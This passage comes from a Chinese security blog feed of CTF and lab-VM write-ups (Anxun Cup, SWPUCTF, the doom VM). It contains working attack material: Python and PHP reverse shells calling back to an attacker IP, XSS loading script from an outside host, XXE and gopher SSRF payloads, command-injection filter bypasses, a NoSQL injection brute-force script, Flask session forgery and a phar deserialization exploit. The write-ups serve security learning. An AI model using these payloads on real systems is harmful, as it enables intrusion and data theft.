难怪之前读index.php时没反应，原来已经给后缀了。拿到密码 但是拿到密码有什么用，又没有后台什么的，卡了很久，后面想起来有个ssh端口开了的，用这个密码登录看看 也不对，不过也能理解，当然不能让你直接root登录啊，不然还提什么权，会不会是用户名不对，再搜集一下信息 主页有个作者 果然用户名是这个，而且还直接进入了python交互界面 这个简单，前面几乎每个靶场都有python调用本地调用shell的 当前用户目录就有一个flag 还有另一个用户目录devops，其目录下也有个flag，但是没有权限查看，看来需要提权到devops 查看这个用户的文件，这个python文件和tmp目录下的test文件有点可疑 查看这个python文件有点意思 但是运行不了这个python文件，因为这个文件是属于devops 但是我们可以编辑这个文件啊，直接把反弹shell的脚本写进去，再监听一下不就反弹shell了 1exec (&apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.179&quot;,5566));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;) 成功反弹shell 常规python调用bash，然后拿到第二个flag 接着就该提权到root权限了，用户文件也看了，只有查看进程了 进程都很正常，那看看sudo -l，看看当前用户可以用root权限执行什么命令 pip，有点意思，看看有没有exp 但是这几个exp都看了下，不好利用啊，限制太多了，看了下师傅们的思路，这种真的就是靠自己的知识储备，思路有，就是搞不出来 利用fakepip提权 得先将exp下载到本地，再在本地开一个web服务 然后利用wget下载到服务器就可以了 接着在本地监听445端口，然后在目标机器上利用这个setup.py重新安装pip就能反弹shell了 可以看到成功提权 总结整体思路 在web页面拿到账号及利用本地文件包含拿到密码，并登录ssh 利用隐藏的python文件提权到devops 利用fakepip提权到root 学到的新东西这次的思路以及技术还比较常规，唯一学到的就是利用fakepip重新安装来提权（实际上是fantanshell）]]></content>
      <tags>
        <tag>靶机渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安洵杯部分WP]]></title>
    <url>%2F2018%2F12%2F31%2F%E5%AE%89%E6%B4%B5%E6%9D%AF%E9%83%A8%E5%88%86WP%2F</url>
    <content type="text"><![CDATA[有些题是队友完成的，我一点都不清楚，就不记录了，下面的题也是队友提供的思路 web1提示参数NOHO，尝试过后可以用数组绕过，拿到post提交框 提交后发现源码返回了sql语句 1&lt;!--SELECT master FROM secret WHERE password = binary &apos; �k�F!�s��N�&amp;&apos;��&apos;--&gt; 后面的参数是md5加密后的值 1md5(test) =&gt; �k�F!�s��N�&amp;&apos;�� 因此可以想到构造 1ffifdyop 成功拿到flag 1e5e8b79aeb213ad6e0e4664e78aff61b web2题目提示 12The Intranets are in range 10.10.1.0/16Please use right protocols :) 在name提交框那里随便提交一个test，发现输出到了url的url参数 于是利用burpsuite，使用http协议扫描一波内网主机 1curl -v &apos;http://222.18.158.227:10180/?url=http%3A%2F%2F10.10.1.0-255&apos; 有10.10.1.3和10.10.1.6两台主机，利用同样的方法扫描端口，发现只有80端口，并且只有10.10.1.6主机才有d0g3.php，访问10.10.1.6/d0g3.php提示 1&lt;!--$_GET[d0g3]--&gt; 传入 1curl -v &apos;http://222.18.158.227:10180/?url=http://10.10.1.6/d0g3.php?d0g3=phpinfo();&apos; 发现执行了命令 于是读取flag 1curl -v &apos;http://222.18.158.227:10180/?url=http://10.10.1.6/d0g3.php?d0g3=echo `cat flag.txt`; &apos; 拿到flag 1D0g3&#123;SSRF_Is_So_Easy&#125; only d0g3er can see flagMagic Mirror思路是在忘记密码处，填入管理员账户admin，重置管理员账号密码，然后登录管理员账号。 但是重置时会发送重置邮件，根据官方的提示，抓包将host改为vps地址，然后在vbs上开启一个web服务，目标主机就会带着重置token去访问我们的vps，然后我们利用这个token访问密码重置页面就能重置admin密码了 登录后还有一个输入框，任意提交一个字符串后抓包发现 1&lt;information&gt;&lt;username&gt;test&lt;/username&gt;&lt;/information&gt; xxe无误，直接读取文件 1234&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY myentity SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/html/flag.php" &gt;]&gt;&lt;information&gt;&lt;username&gt;&amp;myentity;&lt;/username&gt;&lt;/information&gt; 拿到flag的base64编码 1PD9waHAKaGVhZGVyKCJDb250ZW50LVR5cGU6IHRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Iik7CmVjaG8gIjxjZW50ZXI+PGZvbnQgc2l6ZT0nNScgY29sb3I9J3JlZCc+IjsKZWNobyAiWW91IHdhbm5hIGNhcHR1cmUgdGhpcyBmbGFnPyI7CmVjaG8gIjxicj48YnI+IjsKZWNobyAiT2ggeWVzLCBoZXJlISI7CmVjaG8gIjxicj48YnI+IjsKZWNobyAiQnV0IG5vdywgIjsKZWNobyAiPGJyPjxicj4iOwplY2hvICJHZXQgb3V0ISI7CmVjaG8gIjwvZm9udD48L2NlbnRlcj4iOwovL2ZsYWc6IEQwZzN7SGlfRDBnM19SZXMzdF80bmRfeFhlfQoKCj8+Cg== simple sqli一开始以为是二次注入，因为注册一个test’，登录后会报错。后面发现是cookie注入 1sqlmap -r sql.txt --cookie &quot;PHPSESSID=p6364j7vahfs88uiesq03g1e25;uname=1&quot; --dbms mysql --level 2 --tamper base64encode,charencode --sql-shell 当时进入了sql-shell，但是马上时间截止了，很慌就没来得及找web路径，赛后发现有phpinfo 直接读取flag 1select load_file(&apos;/www/sqli/secret.php&apos;) base64解码后就是flag 1D0g3&#123;iaown_oiasnd_asdasda&#125; Hash!!!响应头的source改为1就能拿到核心源码，可以看到是扩展长度攻击，利用hashpump来构造poc 1234567hashpumpInput Signature: c3ef608fdc59d9143c39664ade7556d5Input Data: D0g3Input Key Length: 20Input Data to Add: test5e38fe415ce2786f4ae79776038f53eeD0g3\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x00test 将\x改为%，将POST的username改为D0g3，password改为D0g3%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c0%00%00%00%00%00%00%00test，cookie加入getflag: 5e38fe415ce2786f4ae79776038f53ee 拿到flag 1D0g3&#123;h4sh_1s_s0_diffic1ut_t0_me&#125; Diglett就是个执行curl的命令，尝试了下貌似只能http协议还只能是本地地址，但是多次尝试后发现可以任意文件读取 1curl -d &quot;url=fifilele://127.0.0.1/etc/passwd&quot; http://54.200.169.99:7001/index.php 还给了个提示 1&lt;!-- index.php?hu3debug=1--&gt; 拿到源码，没啥用，因为已经绕过了，再读取下配置文件 1curl -d &quot;url=fifilele://localhost/var/www/config.php&quot; http://54.200.169.99:7001/index.php 拿到mysql配置信息 12345$hosts = &quot;localhost&quot;;$dbusername = &quot;test_user&quot;;$dbpasswd = &quot;&quot;;$dbname = &quot;test&quot;;$dbport = 3306; 然后利用gopherus工具直接生成poc 123456Give MySQL username: test_userGive query to execute: select * from test.flagYour gopher link is ready to do SSRF :gopher://127.0.0.1:3306/_%a8%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%5f%75%73%65%72%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%18%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%74%65%73%74%2e%66%6c%61%67%01%00%00%00%01 提交就能拿到flag 1D0g3&#123;G0ph1er_4nd_55rf_1s_1nt3rest1ng!&#125; BOOM扫到了robots.txt和/admin/login.html，robots.txt里有/readme_.html，拿到了管理员用户名和错的密码 直接爆破，这里用了非预期来爆破 直接把cookie和post的验证码去掉就能绕过验证码进行爆破了，但是不绕过也不难，脚本里加入时间戳就行了 170e052657cb40cf142883abaff266fee]]></content>
      <tags>
        <tag>Write UP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[靶机渗透_doom]]></title>
    <url>%2F2018%2F12%2F31%2F%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-doom%2F</url>
    <content type="text"><![CDATA[信息收集IP1192.168.1.218 端口及服务 操作系统Linux 目录扫目录没扫出什么东西 漏洞挖掘访问666端口显示 1Under Construction, Come Back Later! 多访问两次报错 1234567891011SyntaxError: Unexpected token F in JSON at position 79 at JSON.parse (&lt;anonymous&gt;) at Object.exports.unserialize (/home/nodeadmin/.web/node_modules/node-serialize/lib/serialize.js:62:16) at /home/nodeadmin/.web/server.js:12:29 at Layer.handle [as handle_request] (/home/nodeadmin/.web/node_modules/express/lib/router/layer.js:95:5) at next (/home/nodeadmin/.web/node_modules/express/lib/router/route.js:137:13) at Route.dispatch (/home/nodeadmin/.web/node_modules/express/lib/router/route.js:112:3) at Layer.handle [as handle_request] (/home/nodeadmin/.web/node_modules/express/lib/router/layer.js:95:5) at /home/nodeadmin/.web/node_modules/express/lib/router/index.js:281:22 at Function.process_params (/home/nodeadmin/.web/node_modules/express/lib/router/index.js:335:12) at next (/home/nodeadmin/.web/node_modules/express/lib/router/index.js:275:10) 拿到一些目录，但是这些目录都不能访问 1Cannot GET /home/ 注意到报错信息里有一个serialize.js文件，难道是js反序列化？ 漏洞利用利用nodejsshell生成一个反弹shell的payload 1python nodejsshell.py 192.168.1.179 6789 加上头和尾 1&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function ()&#123; payload&#125;()&quot;&#125; 最后还得将其base64编码 成功getshell 利用前面用过几次的方法——利用python调用本地bash获得一个稳定的shell，因为不然如果之前那个shell掉了的话只有重启虚拟机才能重新反弹shell 提权机器里翻了 一圈没找到啥有用的，看看账号 第一个账号应该就是nodejs服务的账号，看看进程 只有web服务的进程 看看第二个账号的进程 有一个ss-manager进程，这个进程实际上就是shadowsocks，ss服务器上可以看到进程就是这个，在vulners上面有exp 这是个命令执行的漏洞，试了好久才找到命令执行的点，在两个||中间，既然找到了就可以直接反弹fireman的shell了 然后下一步卡住了，看了下提示，太骚了，利用tcpdump来提权 sudo -l下，暴漏出fireman用户可以通过sudo运行哪些命令 这里我们利用tcpdump来提权，首先建立一个shell文件，内容是反弹shell的命令 然后在本地建立一个监听，在目标服务器上利用root权限运行tcpdump，即可反弹一个root权限 总结总体思路 666web端口发现错误信息包含了nodejs反序列化的提示 利用nodejsshell来getshell 利用ss的exp提权到fireman 利用tcpdump提权到root 学到的新东西 nodejs反序列化漏洞 利用ss的exp提权 利用tcpdump提权（其实并不是提权，只是tcpdump以root权限运行，叫tcpdump反弹shell更贴切）]]></content>
      <tags>
        <tag>靶机渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SWPUCTF_WP]]></title>
    <url>%2F2018%2F12%2F31%2FSWPUCTF-WP%2F</url>
    <content type="text"><![CDATA[和小伙伴一起肝了三天，不得不说这次的题目质量很不错（至少对于我来说是这样，学到很多新东西） 用优惠码买个X？这道题是姜锅搞的，我只是最后提出了另外一种payload 扫目录拿到了一个www.zip 123456789101112131415161718192021222324252627&lt;?php//生成优惠码$_SESSION['seed']=rand(0,999999999);function youhuima()&#123; mt_srand($_SESSION['seed']); $str_rand = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"; $auth=''; $len=15; for ( $i = 0; $i &lt; $len; $i++ )&#123; if($i&lt;=($len/2)) $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1); else $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1); &#125; setcookie('Auth', $auth);&#125;//support if (preg_match("/^\d+\.\d+\.\d+\.\d+$/im",$ip))&#123; if (!preg_match("/\?|flag|&#125;|cat|echo|\*/i",$ip))&#123; //执行命令 &#125;else &#123; //flag字段和某些字符被过滤! &#125; &#125;else&#123; // 你的输入不正确! &#125;?&gt; 接着去注册，登录，会送一个类似的优惠码 但是在购买的时候输入此优惠码，会提示过期，并且重新输入一个24位的优惠码。一开始没注意位数，以为只是需要立即提交才行，还写了一个脚本自动抓取优惠码然后自动提交的脚本 后面审计了下脚本，发现mt_rand存在问题，可以预测随机数。因为rand或者mt_rand这类函数是根据随机数种子来生成随机数序列的，可以进行爆破，以下是小伙伴提供的脚本 12345678910111213141516171819202122232425262728&lt;?phpini_set('max_execution_time','0');function youhuima()&#123; mt_srand($_SESSION['seed']); $str_rand = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";//62 $auth=''; $len=15; for ( $i = 0; $i &lt; $len; $i++ )&#123; if($i&lt;=($len/2)) $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1); else $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*(-1), 1); &#125; return $auth; //setcookie('Auth', $auth);&#125;for($i=0;$i&lt;999999999;$i++)&#123; $_SESSION['seed'] = $i; if(youhuima() == "tmqoTcEJIQ5lrsF") &#123; echo $i,"&lt;/br&gt;"; echo youhuima(); exit(); &#125;&#125;//echo "tmqoTcEJIQ5lrsF";?&gt; 将赠送的优惠码放进去，就能爆破出种子来 或者可以利用php_mt_seed这个工具，先利用脚本将赠送的优惠码生成爆破序列，盗用s00py师傅的脚本 12345678910111213&lt;?php$allowable_characters = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';$len = strlen($allowable_characters) - 1;$pass = $argv[1];for ($i = 0; $i &lt; strlen($pass); $i++) &#123; if ($i &lt;= 15 / 2) &#123; $number = strpos($allowable_characters, $pass[$i]); &#125; else &#123; $number = -(strpos($allowable_characters, $pass[$i]) - 62); &#125; echo "$number $number 0 $len ";&#125;echo "\n"; 然后将生成的序列作为参数传递给php_mt_seed就能爆破出种子来了 再利用题目源码的优惠券生成算法，重新生成24位优惠券，填入优惠券购买成功 进入support页面，查看源码 12345678910//support if (preg_match("/^\d+\.\d+\.\d+\.\d+$/im",$ip))&#123; if (!preg_match("/\?|flag|&#125;|cat|echo|\*/i",$ip))&#123; //执行命令 &#125;else &#123; //flag字段和某些字符被过滤! &#125; &#125;else&#123; // 你的输入不正确! &#125; 开启了多行匹配模式，过滤了flag和cat、echo等关键字，以及?和* 多行匹配可以用%0a，过滤关键字可以用通配符，但是这里将?和*都过滤了，那么可以用选择通配符来绕过 1127.0.0.1%0a/bin/ca[t] /fla[g] 付上小伙伴和其他师傅们的payload 1234127.0.0.1%0amore+&apos;/fla&apos;&apos;g&apos;127.0.0.1%0ahead /`ls /|grep &apos;fla&apos;`127.0.0.1%0acd ../../../;ls -l;a=c;b=at;c=fl;d=ag;$a$b $c$d127.0.0.1%0ac\at /fl\ag 另外这里有前端过滤，只能在bp代理提交 Injection ???这个题是真的坑，一开始都在试sql注入，结果给个提示说不一定是sql注入，然后就懵逼了，最后刚了很长时间还是刚出来了，踩了mongodb很多坑 进入题目有提示info.php，是一个phpinfo页面，发现开了mongodb的，试了下果然是nosql注入 这里说明只存在一个admin用户，那么可以利用正则来一位一位的注出admin的密码 登录成功后就能拿到flag 附上sn00py师傅的脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#!/usr/bin/env python3# @Time : 2018/12/17 5:39 PM# @Author : sn00py# @Comment:from PIL import Imageimport pytesseractimport requestsimport sysimport stringvertify_url = "http://123.206.213.66:45678/vertify.php"login_url = "http://123.206.213.66:45678/check.php?&#123;&#125;"cookies = &#123; "PHPSESSID": "7s2jq2cnmkd9lgr4gg06me29e1",&#125;def get_vertify_img(): try: resp = requests.get(url=vertify_url, cookies=cookies) with open('vertify.jpg', 'wb+') as f: f.write(resp.content) except Exception as e: print('验证码获取失败')def get_vertify_code(filename): try: picture = Image.open(filename) text = pytesseract.image_to_string(picture) return text.lower() except Exception as e: print('验证码识别失败') print(e)def login(url): proxies = &#123; 'http': 'http://127.0.0.1:8080', &#125; try: resp = requests.get(url, cookies=cookies) return resp.text except Exception as e: passif __name__ == '__main__': base_char = string.ascii_lowercase + string.digits tmp_pwd = '' while True: flag = True for c in base_char: if flag: while True: # print(c) get_vertify_img() code = get_vertify_code('vertify.jpg') payload = "username[$ne]=toto&amp;password[$regex]=^&#123;&#125;&#123;&#125;.*&amp;vertify=&#123;&#125;".format(tmp_pwd, c, code) url = login_url.format(payload) resp = login(url) if 'username or password incorrect' in resp: break if 'Nice' in resp: tmp_pwd += c flag = False print('password:', tmp_pwd) break else: break 皇家线上赌场审计一直是我们的短板，再加上对这次考察的漏洞理解的很浅，所以这道题只做了前半部分 题目给了目录 1234567891011121314151617[root@localhost]# tree webweb/├── app│ ├── forms.py│ ├── __init__.py│ ├── models.py│ ├── static│ ├── templates│ ├── utils.py│ └── views.py├── req.txt├── run.py├── server.log├── start.sh└── uwsgi.ini[root@localhost]# cat views.py.bakfilename = request.args.get(&apos;file&apos;, &apos;test.js&apos;) if filename.find(&apos;..&apos;) != -1: return abort(403) filename = os.path.join(&apos;app/static&apos;, filename) 进入题目，注册登录： 条件竞争即视感好吗，结果开了多线程试了下没用，转换方向 有一个文件读取的利用点 但是并不能读到web目录下的内容，因为提示说明了 12if filename != '/home/ctf/web/app/static/test.js' and filename.find('/home/ctf/web/app') != -1: return abort(404) 这里可以利用/proc/self/cwd目录来进行读取，至于这个目录是什么东西后面再系统的学习一下 http://107.167.188.241/static?file=/proc/self/cwd/req.txt 123456789101112Click==7.0Flask==1.0.2Flask-SQLAlchemy==2.3.2Flask-WTF==0.14.2itsdangerous==1.1.0Jinja2==2.10MarkupSafe==1.1.0pkg-resources==0.0.0SQLAlchemy==1.2.14uWSGI==2.0.17.1Werkzeug==0.14.1WTForms==2.2.1 http://107.167.188.241/static?file=/proc/self/cwd/app/__init__.py 1234567891011from flask import Flask from flask_sqlalchemy import SQLAlchemy from .views import register_views from .models import db def create_app(): app = Flask(__name__, static_folder='') app.secret_key = '9f516783b42730b7888008dd5c15fe66' app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:////tmp/test.db' register_views(app) db.init_app(app) return app 1http://107.167.188.241/static?file=/proc/self/cwd/app/views.py 1234567891011121314151617181920212223242526272829def register_views(app): @app.before_request def reset_account(): if request.path == '/signup' or request.path == '/login': return uname = username=session.get('username') u = User.query.filter_by(username=uname).first() if u: g.u = u g.flag = 'swpuctf&#123;xxxxxxxxxxxxxx&#125;' if uname == 'admin': return now = int(time()) if (now - u.ts &gt;= 600): u.balance = 10000 u.count = 0 u.ts = now u.save() session['balance'] = 10000 session['count'] = 0 @app.route('/getflag', methods=('POST',)) @login_required def getflag(): u = getattr(g, 'u') if not u or u.balance &lt; 1000000: return '&#123;"s": -1, "msg": "error"&#125;' field = ('field', 'username') mhash = hashlib.sha256(('swpu++&#123;0.' + field + '&#125;').encode('utf-8')).hexdigest() jdata = '&#123;&#123;"&#123;0&#125;":' + '"&#123;1.' + field + '&#125;", "hash": "&#123;2&#125;"&#125;&#125;' return jdata.format(field, g.u, mhash) 只能读到这些文件，需要进行代码审计 首先需要伪造admin的session，先利用工具把当前session解密看看 123python session_cookie_manager.py decode -s &apos;9f516783b42730b7888008dd5c15fe66&apos; -c &apos;.eJwVzDEOgCAQBdG7_NqCRRDDZcwCS2JUNKCV8e7qVK-aG4FXLlHgSX11iPtVTvhfrebp3Bcp8DBZW5Y8mpCEUy9ahd6NgeyQiZWz0ToyTid0uJrUwtu3RDvmyoTnBVA1HwU.XBsiBQ.CNXvc1ih75pObS38JA-ZOZhM6Sw&apos;&#123;u&apos;count&apos;: 0, u&apos;username&apos;: u&apos;spira1&apos;, u&apos;csrf_token&apos;: u&apos;4f25aef84bdead3e20b378b156f1a075c571472d&apos;, u&apos;balance&apos;: 10000&#125; 根据源码可以看到，需要将用户名伪造成admin，并且余额要大于1000000，同样利用这个工具进行加密 123python session_cookie_manager.py encode -s &apos;9f516783b42730b7888008dd5c15fe66&apos; -t &quot;&#123;u&apos;count&apos;: 0, u&apos;username&apos;: u&apos;admin&apos;, u&apos;csrf_token&apos;: u&apos;4f25aef84bdead3e20b378b156f1a075c571472d&apos;, u&apos;balance&apos;: 11130000&#125;&quot;.eJwVzDkOgDAMBdG7_JoizkJQLoOcxJEQYCSWCnF3YKpXzY3MC2sRJCJy5qtD2S49kX4dexvPbRZFgm82sLTB5ypcnViTXRwyhb4RmxhKiOSjrehwHbIrr98VXNdJ8bxyGx9T.Dvy2kA.Q_NqaO9MyIx_lI_IuGWx4Ro1xJY 当时和小伙伴在做的时候，一直以为是python沙箱逃逸 结果发现只要输入()就会500错误，那python沙箱逃逸肯定走不下去了，后面py了下出题人是format格式化字符串漏洞，对这个漏洞的理解还是太浅了，贴一下师傅们的分析过程和payload，后面好好学习一下 由源码可以知道field是一个我们可控的输出点，而这个点又是拼接在g.u后面的，查看源码了解到 1234567class AppContext(object): def __init__(self, app): self.app = app self.url_adapter = app.create_url_adapter(None) self.g = app.app_ctx_globals_class() self._refcnt = 0 那么就需要通过app来读取g，而由__init__.py可知，需要通过db来读取app，又题目提示了save方法，那就以这个方法为切入点进行构造 首先读取save方法下的全局变量 可以看到save的全局变量包含了db，接着读取db的全局变量试试 可以看到包含app，这个app又属于current_app，而源码里定义了app.before_request修饰符，读取其中的全局变量 成功跳到了g，那么就直接读取flag变量 以下是sn00py师傅和cl0und师傅的payload 12save.__globals__[db].__init__.__globals__[_app_ctx_stack].top.g.flagsave.__globals__[SQLAlchemy].__init__.__globals__[current_app].__dict__[view_functions][getflag].__globals__[g].flag cl0und师傅的寻找继承链的脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869import flaskimport osfrom flask import requestfrom flask import gfrom flask import configapp = flask.Flask(__name__)def search(obj, max_depth): visited_clss = [] visited_objs = [] def visit(obj, path='obj', depth=0): yield path, obj if depth == max_depth: return elif isinstance(obj, (int, float, bool, str, bytes)): return elif isinstance(obj, type): if obj in visited_clss: return visited_clss.append(obj) print(obj) else: if obj in visited_objs: return visited_objs.append(obj) # attributes for name in dir(obj): if name.startswith('__') and name.endswith('__'): if name not in ('__globals__', '__class__', '__self__', '__weakref__', '__objclass__', '__module__'): continue attr = getattr(obj, name) yield from visit(attr, '&#123;&#125;.&#123;&#125;'.format(path, name), depth + 1) # dict values if hasattr(obj, 'items') and callable(obj.items): try: for k, v in obj.items(): yield from visit(v, '&#123;&#125;[&#123;&#125;]'.format(path, repr(k)), depth) except: pass # items elif isinstance(obj, (set, list, tuple, frozenset)): for i, v in enumerate(obj): yield from visit(v, '&#123;&#125;[&#123;&#125;]'.format(path, repr(i)), depth) yield from visit(obj)@app.route('/')def index(): return open(__file__).read()@app.route('/shrine/')def shrine(): g.flag = 'flag&#123;&#125;' for path, obj in search(request, 10): if obj == g.flag: return pathif __name__ == '__main__': app.run(debug=True) SimplePHP这道题刚出一会我就肯定是phar反序列化，嘿嘿嘿直觉还是挺准的，刚了一上午还是刚出来了 提示说flag在/f1ag.php 有任意文件读取漏洞，重点是class.php http://120.79.158.180:11115/file.php?file=class.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;?phpclass C1e4r&#123; public $test; public $str; public function __construct($name) &#123; $this-&gt;str = $name; &#125; public function __destruct() &#123; $this-&gt;test = $this-&gt;str; echo $this-&gt;test; &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file) &#123; $this-&gt;source = $file; echo $this-&gt;source; &#125; public function __toString() &#123; $content = $this-&gt;str['str']-&gt;source; return $content; &#125; public function __set($key,$value) &#123; $this-&gt;$key = $value; &#125; public function _show() &#123; if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this-&gt;source)) &#123; die('hacker!'); &#125; else &#123; highlight_file($this-&gt;source); &#125; &#125; public function __wakeup() &#123; if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this-&gt;source)) &#123; echo "hacker~"; $this-&gt;source = "index.php"; &#125; &#125;&#125;class Test&#123; public $file; public $params; public function __construct() &#123; $this-&gt;params = array(); &#125; public function __get($key) &#123; return $this-&gt;get($key); &#125; public function get($key) &#123; if(isset($this-&gt;params[$key])) &#123; $value = $this-&gt;params[$key]; &#125; else &#123; $value = "index.php"; &#125; return $this-&gt;file_get($value); &#125; public function file_get($value) &#123; $text = base64_encode(file_get_contents($value)); return $text; &#125;&#125;?&gt; http://120.79.158.180:11115/file.php?file=function.php 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php //show_source(__FILE__); include "base.php"; header("Content-type: text/html;charset=utf-8"); error_reporting(0); function upload_file_do() &#123; global $_FILES; $filename = md5($_FILES["file"]["name"].$_SERVER["REMOTE_ADDR"]).".jpg"; //mkdir("upload",0777); if(file_exists("upload/" . $filename)) &#123; unlink($filename); &#125; move_uploaded_file($_FILES["file"]["tmp_name"],"upload/" . $filename); echo '&lt;script type="text/javascript"&gt;alert("上传成功!");&lt;/script&gt;'; &#125; function upload_file() &#123; global $_FILES; if(upload_file_check()) &#123; upload_file_do(); &#125; &#125; function upload_file_check() &#123; global $_FILES; $allowed_types = array("gif","jpeg","jpg","png"); $temp = explode(".",$_FILES["file"]["name"]); $extension = end($temp); if(empty($extension)) &#123; //echo "&lt;h4&gt;请选择上传的文件:" . "&lt;h4/&gt;"; &#125; else&#123; if(in_array($extension,$allowed_types)) &#123; return true; &#125; else &#123; echo '&lt;script type="text/javascript"&gt;alert("Invalid file!");&lt;/script&gt;'; return false; &#125; &#125; &#125; ?&gt; 可以发现是一个很明显的phar反序列化漏洞，这里的难点就是理清这个POP链 可以看到可控的文件输出点为Test类的$text = base64_encode(file_get_contents($value));，而$value的值来自于 $value = $this-&gt;params[$key];，重点是这个构造方法 1234public function __construct() &#123; $this-&gt;params = array(); &#125; 回到Show类，可以看到__toString这个构造方法 12345public function __toString() &#123; $content = $this-&gt;str['str']-&gt;source; return $content; &#125; __toString触发的条件很多，容易被疏略，常见的条件有（盗用K0rz3n师傅博客的原文） (1)echo ($obj) / print($obj) 打印时会触发 (2)反序列化对象与字符串连接时 (3)反序列化对象参与格式化字符串时 (4)反序列化对象与字符串进行==比较时（PHP进行\==比较的时候会转换参数类型） (5)反序列化对象参与格式化SQL语句，绑定参数时 (6)反序列化对象在经过php字符串函数，如 strlen()、addslashes()时 (7)在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用 (8)反序列化的对象作为 class_exists() 的参数的时候 最后就是C1e4r类的__destruct方法，成为最后输出的可控点 123456public function __destruct() &#123; $this-&gt;test = $this-&gt;str; echo $this-&gt;test; &#125;&#125; 最后构造的恶意的文件为 12345678910111213141516171819202122232425&lt;?php class Test &#123;&#125;class Show &#123;&#125;class C1e4r &#123;&#125;$my_test = new Test();$my_test-&gt;params = ['source' =&gt; '/var/www/html/f1ag.php'];$my_show = new Show();$my_show-&gt;str = ['str' =&gt; $my_test];$my_c1e4r = new C1e4r();$my_c1e4r-&gt;str = $my_show;@unlink("spira1.phar");$phar = new Phar("spira1.phar");$phar-&gt;startBuffering();$phar-&gt;setStub("GIF89a" . "&lt;?php __HALT_COMPILER(); ?&gt;");$phar-&gt;setMetadata($my_c1e4r);$phar-&gt;addFromString("test.txt", 'test');$phar-&gt;stopBuffering();?&gt; 运行这个文件会生成一个恶意的spira1.phar文件，因为上传有过滤，就把后缀改为.jpg 又保存的文件名为$filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;;，所以最后访问http://120.79.158.180:11115/file.php?file=phar:///var/www/html/upload/文件名.jpg/test.txt即可拿到flag 有趣的邮箱注册这道题getshell是小川搞的，后面提权是我的思路，不得不说小川的js很强，我的js就菜的不成样子了 首先有一个邮箱验证，这里给了源码 12345678910if($_POST['email']) &#123;$email = $_POST['email'];if(!filter_var($email,FILTER_VALIDATE_EMAIL))&#123;echo "error email, please check your email";&#125;else&#123;echo "等待管理员自动审核";echo $email;&#125;&#125;?&gt; 这里filter_var函数存在缺陷，可以绕过，参考P神文章 还有个admin/admin.php，但是访问提示only localhost allowed! 应该是利用xss去本地访问管理员页面，利用xss平台可以构造 1&quot;&quot;&lt;sCRiPt/SrC=//xsspt.com/&gt;&lt;/sCRiPt&gt;&quot;@123.com&quot; 读取/admin/admin.php源码，发现a0a.php存在命令执行，直接利用php反弹shell 1php -r '$sock=fsockopen("vps",port);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");' 直接读取flag提示权限不足，是flag用户的文件，而flag用户属于nginx用户组 翻web目录发现还存在另一个web服务，是nginx用户，有上传，有打包备份 这个web服务只能读upload.php 12345678910111213&lt;?phpinclude("upload.php");echo "上传目录：" . $upload_dir . "&lt;br /&gt;";$sys = "tar -czf z.tar.gz *";chdir($upload_dir);system($sys);if(file_exists('z.tar.gz'))&#123; echo "上传目录下的所有文件备份成功!&lt;br /&gt;"; echo "备份文件名: z.tar.gz";&#125;else&#123; echo "未上传文件，无法备份！";&#125;?&gt; 上传后访问发现404，被秒删？当时想的时候条件竞争，开bp多线程，发现并不行，后面才知道是路由的原因 这个tar存在提权问题，分别创建三个文件 123echo &quot;mkfifo 